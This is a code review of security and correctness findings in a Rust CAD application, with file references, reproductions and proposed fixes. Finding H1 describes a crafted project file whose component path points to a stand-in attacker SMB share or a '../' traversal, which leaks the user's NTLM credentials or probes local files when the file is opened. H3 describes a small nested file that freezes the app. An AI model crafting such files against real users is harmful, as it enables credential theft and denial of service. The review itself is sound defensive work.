## HIGH

### H1. Opening a project reads attacker-chosen files: `query.components` runs unconfined as the user
- `crates/gusset-app/src/app.rs:1026`: after every open the app submits `query.components`
  (`Then::ComponentUpdates`).
- `crates/gusset-commands/src/commands/component.rs:296-312` (`QueryComponents::run`) calls
  `read_source(s, ctx, &d.source, None)` for every component. `d.source` is a string from the
  opened document.
- `read_source` (`component.rs:21-43`) uses `paths::read_target` (`paths.rs`, `read_target`). For the
  user actor that is `export_target`: an absolute path is returned as is, a relative path is joined
  to the project folder with `..` allowed. Only agents go through `confined`.
- Failure path:
  1. Someone sends a `.gus` assembly (or a zip with the assembly and a part) whose component line
     says `source: "//attacker.example/share/x.gus"`, `"\\\\attacker\\share\\x.gus"` or
     `"../../somewhere/x.gus"`.
  2. The victim opens it. Nothing asks them. The model thread opens that path, reads up to 1 GiB
     (`MAX_IMPORT_BYTES`) and decodes the whole container (`gusset_project::decode`, up to the
     container's 16 GiB decompression limit).
  3. On Windows a UNC path starts an SMB connection from the app, which sends the user's NTLM
     credentials. On any platform a path on a slow or hung mount blocks the model thread, and
     `read_capped` is called with a default (never set) cancel flag.
  4. With 1000 components naming the same 1 GiB file, the read and decode run 1000 times, because
     nothing groups by source.
- This breaks PROMPT.md "Untrusted input": "Opening a file must never ... access the network, or touch
  files outside what the user chose." The result also tells the attacker one bit per path
  (`update_available`, or `source_error`).
- Reproduced: a session with a document whose component source is an absolute path outside the
  project folder. As user, `query.components` read it and returned `update_available: true`. As an
  agent, the same call returned `source_error: "paths must stay inside the project folder"`.
- Fix:
  - Do not run it on open. Offer "Check components for updates" as an explicit action, or confine
    the check to the project folder (the `confined` rules, for every actor).
  - Refuse UNC (`\\`, `//`), device and non-local paths in `source` for any actor.
  - Read each distinct source once. Run it off the model thread with a cancel flag and a time
    limit.
  - A source the user chose in the file dialog is fine to read when the user presses Update.

### H2. `configuration.save` with a repeated parameter commits a document that cannot be read back
- `crates/gusset-commands/src/commands/configuration.rs:35-48`: `names` is `self.params` as given, with
  no duplicate check.
- `crates/gusset-doc/src/validate.rs:92-110` only checks that the names exist. The text printer writes
  `set: [w = 5 mm, w = 5 mm]`, and `parse_assignments` (`text.rs`, "'{n}' is set twice") refuses it.
- The history stores the configuration inside the parameter object, so the node is committed, and
  the next read of its snapshot fails.
- Reproduced: `configuration.save {"name":"A","params":["w","w"]}` returns `rebuild_ok: true`.
  After that `s.document()`, `query.model` and `param.set` all fail with
  `history object ... is damaged: line 3, column 35: 'w' is set twice`. `history.undo` works.
  `gusset_project::encode` succeeds, and after `decode` the head document is `Corrupt`.
- An agent can do this with one mistaken argument. Until someone undoes it, the session is unusable
  and a save writes the damaged head.
- Same class: any command that builds a `Document` the text parser would refuse commits an
  unreadable node. Nothing in `commit` guarantees print/parse symmetry; I only found this one
  command that breaks it.
- Fix:
  - Deduplicate `params` in the command, and make `validate` reject repeated names in a
    configuration's `set`.
  - In `ObjectStore::stage` (or `History::commit`), parse back what was printed and refuse the commit
    when it does not parse. This is cheap and closes the whole class.

### H3. Component nesting has no total limit: fan-out multiplies cost, and nothing charges it
- Depth is capped at 8 (`component.rs:15`, `eval/component.rs:7`) but the number of components per
  document is only capped by `MAX_FEATURES` (100 000). A document with N components that all name the
  next level's document, over 8 levels, costs N^8.
- Two places pay it:
  1. `copy_blobs` (`component.rs:47-72`) recurses into every component with no visited set. It parses
     the inner document each time. It runs on the model thread with no cancel check. The MCP
     deadline cannot stop it, and everything queues behind it.
     Reproduced (8-level chain, N components per level, mock kernel): N=2 52 ms, N=3 1.1 s, N=4 11 s.
     N=10 is hours, from a file of about 100 lines.
  2. `run_component` (`eval/component.rs:35-130`) builds a fresh `Evaluator` per component. Its `State`
     (and so its `Work` budget, ADR 0020) starts at zero, so the boolean-face and tool limits do not
     add up across components. The outer cache cannot help because each component feature has a
     different name, so a different key. Reproduced: opening such a document, N=3 4.3 s, N=4 45 s
     (mock kernel, which is much cheaper than OCCT). Stop works here (the inner evaluator shares the
     cancel flag), but the next rebuild starts it again.
- A single file of a few KB therefore freezes the app on open (the pinned documents are in the file
  itself, so no extra file is needed).
- Fix:
  - `copy_blobs`: keep a `BTreeSet<Hash>` of documents already copied (the closure code in
    `objects.rs:389` already does), and check the cancel flag.
  - Evaluation: one shared budget for a whole evaluation including its components (count the inner
    features and boolean work into the outer `State.work`), plus a cap on the total number of
    component instances (for example 1000) per evaluation. Cache the inner result by
    (document hash, `set`, `configuration`) so identical instances are built once.
  - Cap the number of `component` features per document in `validate`.

## MEDIUM

### M1. The loop solver has no limit on unknowns or time and cannot be stopped
- `crates/gusset-eval/src/joint.rs:247-299` (`close_loops`) solves all `free` values of all joints so
  far at every closing joint. `least_squares` (`joint.rs:501-554`) builds the dense normal equations
  and runs Gaussian elimination, O(n^3) in the number of unknowns, up to 200 iterations x 30 damping
  attempts. Nothing limits `free`, nothing charges the work budget, and nothing polls the cancel
  flag.
- Reproduced (debug build, mock kernel): n free ball joints (3 unknowns each) and one closing joint
  that cannot close: 150 unknowns 0.5 s, 300 unknowns 4.3 s, 600 unknowns 30 s. Four closing
  joints with 600 unknowns: 124 s. Each further closing joint repeats it, and Stop cannot interrupt
  it.
- Unknowns that do not touch the loop still count (their columns are zero, they still enlarge the
  matrix).
- Fix:
  - Only the free values of joints that can move a body of the closing joint's loop (connected
    through `fixed`/`moving`/`with`) are unknowns.
  - Cap unknowns (for example 60), poll `self.is_cancelled()` per iteration, and charge the work.

### M2. A failed joint stays in the joint state and breaks the joints after it
- `joint.rs:233` pushes the joint's record before anything can fail: before `vals.check` (`joint.rs:235`)
  for ordinary joints, and before the solve (`joint.rs:247`) for closing ones. `evaluator::apply`
  (`lib.rs:~871`) keeps the state mutated by a failing feature, and only dependants named in
  `dependencies()` are blocked. A later joint on the same body does not depend on the failed joint,
  so it is evaluated.
- Failure path (a): `Joint1` slider fails its limits. The block is not moved but `Joint1`'s record
  says `moving: Block, closing: false`. A second joint on the block is then classified as closing
  (`joint.rs:229`) and fails: "the joint loop cannot close: 12.0000 mm and 180.0000° apart ('Extrude2'
  is already placed by Joint1: list the values the solver may choose in free ...)". It blames a joint
  that never placed anything, and the suggested fix (`free`) is wrong.
  Reproduced (the user adds a second joint instead of fixing the first).
- Failure path (b): a closing joint that cannot close keeps its record with `closing: true`. Its
  residual is part of `loop_residual` for every later closing joint, because that function takes all
  closing records. Reproduced: `Joint2` cannot close; an independent loop on another body
  (`Joint3` free slider, `Joint4` rigid, the exact setup of the passing unit test
  `a_second_joint_closes_the_loop...`) now fails with the same "180.0000° apart" error. Only the
  first fault should be reported.
- Failure path (c): `move_body` (`joint.rs:312-313`) records the new placement before the kernel calls
  succeed. When the transform of a carried body fails, earlier bodies of the same joint are already
  moved while the joint is reported failed. Traced.
- Fix: build the new `Joints` value on the side and install it only when the joint succeeds
  (`s.joints = Arc::new(new)` at the end), and record `placed` after the kernel calls.

### M3. A joint accepts frames and body lists that silently place bodies wrongly
All four were reproduced with the mock kernel; none gives an error or a warning.
- `at` frame on another body (`joint.rs:206` discards the body of the `at` frame): a joint with
  `body: Block, at: Extrude1/cap(start)` (a face of the plate), `to: origin` accepted, and moved the
  block by the transform that would put the plate's face on the origin (block centroid
  `[85, 5, -2.5]`, while the plate stayed). Nothing checks that the `at` frame lies on `body` or on
  one of `with`. `moving_local` is then computed from the wrong body's placement, so the loop solver
  replays it differently from the first placement. Likewise `fixed` is ignored when the `to` frame
  lies on the moving body (`joint.rs:225`, `filter(|b| *b != d.body)`), and not detected when it lies
  on a carried body.
- `with` contains an already placed body: only `d.body` decides "closing" (`joint.rs:229`), so a
  carried body that an earlier joint placed is moved again by the second joint and the first joint's
  constraint is silently broken (reproduced: block placed by `Joint1`, then `Joint2` with
  `body: B3, with: [Block]`; the block, placed by `Joint1` at x=105 mm, ends at x=-220 mm, far from `Joint1`'s frame, with `Joint1` still reported ok).
- Duplicate `with` entries: `with: ["B3", "Extrude3"]` (body name and feature name of the same body)
  or `with: [B3, B3]`. Neither the text parser (`parse_ident_list`) nor `validate` checks, and the
  command resolves both to the same feature. `joint.rs:237` moves the body twice. Reproduced: B3
  ended at `[95, 5, 2.5]` instead of `[200, 0, 47.5]`, `rebuild_ok: true`.
- `with` on a closing joint is ignored (`close_loops` only moves bodies from `placements`, which
  skips closing records): the carried bodies stay where they were. Reproduced: block closes the loop,
  `Third` listed in `with` stays at x=305.
- Fix: in `run_joint`, require the `at` frame's body to be `d.body` or in `with`, and the `to` frame's
  body to be none of them (error naming the frame); reject `with` entries equal to each other after
  name resolution (`validate` + the command) and entries a previous non-closing joint placed; for
  closing joints either carry `with` along or refuse it.

### M4. Plain-number range bounds are in mm and radians, not the document's unit
- `crates/gusset-units/src/params.rs:157-187` (`check_range`): a plain-number bound becomes
  `Quantity::new(b.value, q.dim)`, so the number is used as base units. ADR 0027 §1 says "a plain number
  takes it" (the parameter's unit), and the slider text says lengths are shown in the document's unit
  and angles in degrees. A plain-number value elsewhere is read in the document's default unit
  (`params::interpret`).
- Reproduced:
  - `units in`, `param ok = 2 in, min: 1, max: 3` fails: "'ok' is outside its range (1 to 3 in base
    units)". 2 in is 50.8 mm, outside 1..3 mm. The user meant inches.
  - `param ang = 45 deg, min: 10, max: 90` fails (0.785 rad is below 10 rad).
  - `param a = 100 deg, max: 90` is accepted: the range never triggers (100 deg is 1.7 rad, below
    90 rad).
  - `param n = 40, min: 10 mm` (a plain-number parameter) fails with a dimension mismatch, although
    the same plain number is later read as 40 mm.
- The browser slider (`browser.rs:463-487`) uses the same bounds, so it agrees with the check but not
  with the ADR.
- Fix: convert plain-number bounds the way `interpret` converts values (length: document unit,
  angle: degrees) when the value is a length or angle, and accept a plain-number parameter with a
  length bound by interpreting the parameter first. Add the inch and degree cases to the tests.

### M5. The branch preview ignores range and configuration changes, but merge applies them
- `crates/gusset-history/src/diff.rs:43-92` (`diff_documents`) compares parameters by `expr` and
  `comment` only, and has no configuration section. `branch.compare` (what the agents panel shows
  before "Apply") is built from it.
- `branch.merge` (`commands.rs:~2530`, `merge.rs:70-109`) compares the whole `Param` (including
  `range`) and the configurations, so the merge takes them.
- Failure path: an agent branch widens `max`, removes `min`, or changes a configuration's values.
  The panel shows no change for that item; Apply (now `branch.merge` since 25b72e2) brings it into the
  user's branch. Before 25b72e2 `apply_branch` was built from the same diff and cherry-pick, so the
  behaviour changed with it.
- Fix: add `range` changes to the parameter diff and a `configurations` list to `DocDiff`; show them in
  `compare_lines`.

## LOW

### L1. The BOM counts mirror-image parts as one
`assembly.rs:185-215` groups bodies by volume, area, face count and edge count. A left and a right
part have identical values for all four, so a pair of mirrored parts (hinges, brackets) becomes one
row with quantity 2. Traced. Fix: add a cheap handedness or inertia signature (the principal
moments and the sign of a third moment), or compare shapes after aligning, or say in the output that
mirror images are not told apart.

### L2. Every placed body is moved again at every closing joint
`close_loops` (`joint.rs:289-294`) moves every body in `placements` by `target * placed^-1`.
`move_body` only skips when the rotation angle is below 1e-12 and the translation is exactly zero
(`joint.rs:309`, `dot(t.t, t.t) > 0.0`). Recomputing placements from the values differs from the
incremental placement by rounding noise (about 1e-13), so almost every body gets a kernel transform,
a topology call and a naming pass at every closing joint, including bodies that are not in the loop.
Cost grows with bodies x closing joints, and the shapes drift by rounding each time. Traced, not
measured. Fix: compare with a tolerance (1e-9 mm, 1e-12 rad) and only touch bodies whose placement
changed by more.

### L3. `merge_base` trusts node labels
`history.rs:1164-1176` finds the "last merged iteration" by parsing a label that starts with `Merge `
and ends with ` (nN)`. Labels come from commands in this app, but also from any loaded `.gus` file.
A file with such a label on a node can make the next merge use a node of the other branch as the base,
so changes of the other branch up to that node are treated as already merged and silently skipped.
Traced. Fix: record the merged node in a field of the node (`merged_from`) that is part of the node
line format and checked on load.

### L4. The customizer slider overwrites derived parameters and disappears when it is needed
- `browser.rs:489-510`: releasing the slider sends `param.set` with a literal (`"{x} {unit}"`). For a
  parameter defined by an expression (`width = height * 2, min: 10, max: 100`) the expression is
  replaced silently. It is one undoable edit, but the slider is shown for every parameter with a
  range, so a stray click on a derived parameter breaks the relation.
- `slider_of` (`browser.rs:463`) needs the parameter's current value to evaluate; an out-of-range
  value is an error, so the slider is not shown exactly when it would help to bring the value back.
- Traced. Fix: show the slider only for parameters whose expression is a literal; when out of range,
  show the slider with the value clamped to the range.

### L5. `assembly.update_component` repoints and may break the component
- `component.rs:209` reads the source with `branch: None`. A component inserted from branch `idea` is
  pinned to `idea`, then `query.components` (branch `main` head) reports `update_available: true`
  forever, and `update_component` silently moves it to `main`. `ComponentDef` has no branch field.
- `component.rs:206-230` does not run `assignments(...)` for the existing `set` against the new
  document. If the new head renamed or removed a parameter the component sets, the update commits a
  broken model (`rebuild_ok: false`); it is undoable and reported.
- Traced. Fix: store the branch in `ComponentDef`; check `set` and `configuration` against the new
  document and refuse (or drop them with a message).

### L6. Interference and motion studies have no work limit
`assembly.rs:22-45` runs a boolean for every pair of bodies whose boxes overlap: N^2 booleans when a
model has many overlapping bodies (a pattern of overlapping tools). `study.motion` repeats a full
evaluation for up to 100 steps and, with `interference: true`, the pairs at each step. Both are
`READ` commands, so a read-only agent can run them; they fall under the host's cancel scope and the
MCP deadline but not under the evaluation budget. Traced. Fix: cap pairs (for example 2000) and report
`truncated: true`, and make the cost visible in the description.

### L7. A component stores the user's absolute path and the source document's text
`component.rs:164-175`: for the user, `source` is the path as typed or chosen, absolute included
(`C:\Users\name\...`). It is written into the project file and shared with the assembly. The pinned
document also includes the source's notes, labels and parameter comments. Agents then cannot refresh
such a component (`confined` refuses absolute paths). Traced. Fix: store a path relative to the
project folder when the file is inside it; tell the user the pinned text includes notes.

## NIT

- **N1.** `assembly.rs:39`: `Err(e) if e.message.contains("removed all material")` ties the
  interference result to the OCCT shim's message (`gusset_occt.cpp:1175,1219`). A kernel that words it
  differently turns every box-overlapping, non-overlapping pair into an `"error"` row. Use a
  `KernelErrorKind` (for example `EmptyResult`).
- **N2.** `joint.rs:362-367`: the limit error prints "(0 and 10 in base units: radians or mm)", and in a
  closing joint (`joint.rs:286`) `check(&r.name)` names an earlier joint while the status is attached to the
  closing feature. Show the values in the document's unit and say which joint.
- **N3.** `commands.rs:~2546`: when the merge takes nothing (`from_theirs` is empty) even though conflicts
  were resolved with `prefer: ours`, no node is committed, so the same conflicts are reported at the
  next merge. Commit a merge node (with the label) whenever `prefer` was used.

## Checked and found sound

- **Agent confinement of component sources.** `confined` (`paths.rs`) rejects absolute paths, `..`,
  backslashes and NUL, canonicalises the parent, and refuses a symlink at the target;
  `open_regular` adds `O_NOFOLLOW | O_NONBLOCK`, regular-file and size checks; `read_source` adds the
  `.gus` extension check. Error messages use `display_name`, no absolute paths. Reproduced: the agent
  got "paths must stay inside the project folder" for a source outside the project.
- **Depth.** Nesting depth is checked in `copy_blobs` (8), `run_component` (8, thread-local `DEPTH`
  restored after the inner evaluation, inner evaluation single-threaded) and `feature_blobs` (32). The
  snapshot closure has a visited set, so GC and save are linear in distinct component documents. A
  test covers nested component documents surviving GC.
- **Cache keys for components and joints.** `step_key` includes the feature's printed text (so the
  `document` hash, `body`, `configuration`) and the values of every parameter in `set`/joint
  expressions; `deps.rs` treats a loop-closing or `free` joint as dynamic (reads every earlier body)
  and `Delta::diff` refuses any feature whose `joints` Arc changed. A joint with a `to` frame on another
  body is dynamic by the naming rule. I found no path that serves a stale body for these.
- **Loop solver determinism.** `libm` sin/cos/atan2, `BTreeMap` placements, `total_cmp` pivots, no
  threads or hash iteration, starting guess from the written values. Limits are checked on solved
  values. The rotation-vector fallback near a half turn and the `axis_angle` threshold are correct;
  the `gusset-eval` tests pass (the four-bar OCCT test needs OCCT, which I did not run).
- **Three-way merge.** `pick` is symmetric and correct for added, removed, changed and same-change
  items; order handling for theirs-only features (including ones ours deleted) gives the expected
  positions; a one-sided reorder is taken and a two-sided one conflicts; the result is validated and
  committed as one undoable node; the merge label stays below the 200-character label cap (branch name
  limit 120). Expression equality is span-sensitive, but all three sides come from re-parsed canonical
  object text, so spans agree.
- **Parameter rename and delete** follow ranges and configurations (`commands.rs:927-965, 1038-1056`);
  `ParamSet` rejects a value outside its own range; text round trip with range and comment verified.
- **Kernel worker fixes.** L4: the gate is a required argument, `import_step/iges` are refused in the
  client, the pool and the worker (`Unsupported`), and no production code calls them. L5: `Status`
  returns the sandbox report, protocol version bumped to 3, `diagnostics()` is read once at startup and
  by `self-test`. N2: `Server::handle` removes shapes registered for a reply it cannot encode (ids
  above the counter taken before encoding; `Table::id_of` increments first), and a reply the client
  cannot decode restarts the worker. N3: `started` is set after the abandonment check; the tiny window
  between the check and the store is covered by the revert after the command. No new finding there.
- **Wire format.** New `axis` and `circle` fields use `Option` with updated `MIN_SIZE`; round trips are
  tested; the C++ shim writes 15 and 13 doubles per face and edge as the Rust side reads.
- **Joint-frame picking in the app** only fills form fields; the command parses and validates them
  again. **MCP**: the tool-list budget test passes (the new commands are not in the default list), and
  the output sanitizer handles `source`, `version` and `set` strings like other model text.
- **Pinned component data.** The pinned document hash is validated (`is_hash`); the text is parsed with
  the 64 MiB / 100 000 feature caps; import blobs inside a component go through the same
  `read_native` gate as any import, so an untrusted blob is vetted by the import worker before the
  kernel worker parses it (the in-process fallback and CLI are as exposed as before, see review
  2026-10-13 L3).
